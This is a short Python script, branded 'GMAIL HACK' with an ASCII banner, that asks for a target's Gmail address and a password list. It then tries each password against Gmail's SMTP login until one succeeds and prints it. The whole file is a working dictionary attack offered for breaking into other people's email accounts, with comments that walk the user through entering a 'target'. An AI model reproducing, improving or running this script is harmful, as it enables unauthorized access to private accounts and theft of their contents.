import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print("""
█  █  █████ █   █ █████  ████ █████
█ █     █   ██  █ █     █       █
██ █    █   █ █ █ ████  █       █
█  █    █   █  ██ █     █       █
█   █ █████ █   █ █████  ████   █
""")
print("___________________GMAIL HACK_________________")
#this tells you to enter the targets username and the file
#that has the list of passwords to enter
user = input("[*] Enter targets gmail adress: ")
passwdfile = input("[*] Enter the path to the password file: ")
print("\n")
file = open (passwdfile, 'r')

for password in file:
    password = password.strip('\n')
#this line will try the password on the gmail adress#
    try:
        smtpserver.login(user, password)
        print("[+] password found: %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[-] wrong password: " + password)
input()